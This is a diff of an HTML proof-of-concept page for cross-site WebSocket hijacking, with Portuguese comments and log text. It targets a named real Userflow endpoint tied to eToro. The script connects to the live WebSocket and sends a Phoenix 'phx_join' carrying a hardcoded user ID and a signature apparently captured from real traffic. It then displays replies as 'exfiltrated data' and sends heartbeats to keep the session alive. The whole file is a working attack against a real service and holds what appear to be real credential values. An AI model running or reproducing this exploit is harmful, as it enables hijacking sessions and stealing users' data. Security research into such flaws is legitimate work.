@@ -2,102 +2,123 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CSWSH Exploit PoC - Userflow/eToro</title>
+    <title>CSWSH Exploit PoC - eToro / Userflow</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #00ff41; padding: 20px; }
-        #console { background: #000; border: 1px solid #444; padding: 15px; height: 500px; overflow-y: auto; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
-        .info { color: #888; }
+        body { font-family: 'Courier New', Courier, monospace; background-color: #0d0d0d; color: #00ff41; padding: 20px; }
+        #console { background: #000; border: 1px solid #00ff41; padding: 15px; height: 600px; overflow-y: auto; box-shadow: 0 0 15px rgba(0,255,65,0.3); }
         .success { color: #55ff55; font-weight: bold; }
         .error { color: #ff5555; }
-        .data { color: #ffff55; background: #222; padding: 5px; margin: 5px 0; border-left: 3px solid #ffff55; }
-        h2 { color: #fff; margin-bottom: 10px; }
+        .data { color: #ffff55; background: #1a1a1a; padding: 10px; margin: 10px 0; border-left: 4px solid #ffff55; white-space: pre-wrap; word-break: break-all; }
+        .header-info { color: #aaa; margin-bottom: 15px; }
+        h2 { border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
     </style>
 </head>
 <body>
-    <h2>WebSocket Hijacking PoC (Identity Replay)</h2>
-    <div class="info">Alvo: wss://e.userflow.com</div>
-    <div class="info">Origem do Teste: <span id="origin"></span></div>
-    <hr>
+    <h2>WebSocket Hijacking PoC (Phoenix Protocol)</h2>
+    <div class="header-info">
+        Alvo: wss://e.userflow.com/end-users/ct_lu2g2jsjmncxfcerlwcpl3yyca/socket/websocket<br>
+        Status do Origin Bypass: <span id="bypass-status">Testando...</span>
+    </div>
     <div id="console"></div>
 
     <script>
-        // Configurações extraídas do seu tráfego
-        const userId = "47554719";
-        const signature = "7c3a5d9c0a16d1d9d7332ab1dafec3d7823557f5519dcf5efacbf34ea3de390e";
-        const endpoint = `wss://e.userflow.com/end-users/ct_lu2g2jsjmncxfcerlwcpl3yyca/socket/websocket?vsn=2.0.0`;
-        
         const consoleDiv = document.getElementById("console");
-        document.getElementById("origin").textContent = window.location.origin || "Local File";
+        const bypassStatus = document.getElementById("bypass-status");
 
         function log(msg, type = "") {
             const p = document.createElement("p");
             p.className = type;
-            const time = new Date().toLocaleTimeString();
-            p.textContent = `[${time}] ${msg}`;
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
             consoleDiv.appendChild(p);
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
-        log("Iniciando conexão maliciosa...");
+        const endpoint = "wss://e.userflow.com/end-users/ct_lu2g2jsjmncxfcerlwcpl3yyca/socket/websocket?vsn=2.0.0";
 
         try {
+            log("Iniciando Handshake com Origin malicioso...");
             const ws = new WebSocket(endpoint);
 
             ws.onopen = () => {
-                log("Conexão WebSocket aberta! (Handshake Origin Bypass confirmado)", "success");
+                bypassStatus.textContent = "CONEXÃO ACEITA (VULNERÁVEL)";
+                bypassStatus.style.color = "#ff5555";
+                log("Handshake HTTP 101 Switching Protocols bem-sucedido!", "success");
 
-                // Payload idêntico ao do framework Phoenix que você capturou
-                const joinPayload = JSON.stringify([
+                // Payload completo para passar na validação de Server-side Schema do Userflow
+                const fullPayload = [
                     "6", 
                     "6", 
-                    `end_users:${userId}`, 
+                    "end_users:47554719", 
                     "phx_join", 
                     {
                         "protocolVersion": 2,
                         "userflowClientBuild": "1021223",
-                        "signature": signature,
+                        "signature": "7c3a5d9c0a16d1d9d7332ab1dafec3d7823557f5519dcf5efacbf34ea3de390e",
+                        "groupExternalId": null,
+                        "groupSignature": null,
+                        "flowSessionId": null,
+                        "checklistSessionId": null,
+                        "bannerSessionId": null,
+                        "resourceCenterSessionId": null,
+                        "siteSessionId": null,
+                        "launchers": [],
+                        "trackers": [],
+                        "hasDraftSession": false,
+                        "clientConditions": [
+                            {"conditionId":"dc59597b-18b6-48c4-87af-111ebd2b5045","isTrue":false},
+                            {"conditionId":"4482a863-4ab0-4ec7-b3be-05be00716c0f","isTrue":false},
+                            {"conditionId":"3215ad30-7a8d-455c-afb4-38ca8d91d858","isTrue":false},
+                            {"conditionId":"fa728c9c-b7f2-40b7-b1cd-3190234fa907","isTrue":false},
+                            {"conditionId":"487ae4d2-8d59-4d7f-a2ca-4aecc8acb8fa","isTrue":false},
+                            {"conditionId":"9ed05fbb-d4c0-4124-8bfb-8e8077eee9f0","isTrue":false},
+                            {"conditionId":"0e8cd5da-8449-44b7-b879-ab0aaa7a45cf","isTrue":true}
+                        ],
+                        "previewFlowId": null,
                         "clientContext": {
                             "pageUrl": "https://www.etoro.com/settings/",
                             "viewportWidth": 1643,
                             "viewportHeight": 768
                         }
                     }
-                ]);
+                ];
 
-                log("Enviando PHX_JOIN com assinatura sequestrada...");
-                ws.send(joinPayload);
+                log("Enviando requisição de inscrição no canal (phx_join)...");
+                ws.send(JSON.stringify(fullPayload));
             };
 
             ws.onmessage = (event) => {
-                const rawData = event.data;
+                const data = event.data;
+                log("SERVIDOR RESPONDEU:", "success");
                 
-                if (rawData.includes("phx_reply") && rawData.includes("ok")) {
-                    log("AUTENTICAÇÃO COM SUCESSO! O canal está aberto para exfiltração.", "success");
-                } else if (rawData.includes("error")) {
-                    log("ERRO NA AUTENTICAÇÃO: " + rawData, "error");
-                } else {
-                    log("DADOS EXFILTRADOS: " + rawData, "data");
+                // Formatação para facilitar a leitura no console do PoC
+                const msgDiv = document.createElement("div");
+                msgDiv.className = "data";
+                msgDiv.textContent = data;
+                consoleDiv.appendChild(msgDiv);
+
+                if (data.includes('"status":"ok"')) {
+                    log("AUTENTICAÇÃO COMPLETA! Sequestro de dados ativo.", "success");
                 }
 
-                // Manter a conexão viva (Heartbeat necessário no Phoenix)
-                if (rawData.includes("phx_reply")) {
+                // Heartbeat para não deixar a conexão cair
+                if (data.includes("phx_reply")) {
                     setTimeout(() => {
                         ws.send(JSON.stringify([null, "7", "phoenix", "heartbeat", {}]));
-                        log("Enviando heartbeat para manter sequestro ativo...", "info");
+                        log("Enviando Heartbeat...");
                     }, 30000);
                 }
             };
 
-            ws.onerror = (err) => {
-                log("Erro no WebSocket. Verifique se o ID ou a Assinatura expiraram.", "error");
+            ws.onerror = (e) => {
+                log("Erro na conexão via WebSocket. Possível bloqueio de segurança ou ID expirado.", "error");
             };
 
             ws.onclose = () => {
-                log("Conexão encerrada pelo servidor remoto.", "error");
+                log("A conexão foi encerrada pelo servidor Userflow.", "error");
             };
 
-        } catch (e) {
-            log("Falha crítica: " + e.message, "error");
+        } catch (err) {
+            log("Erro fatal no script: " + err.message, "error");
         }
     </script>
 </body>
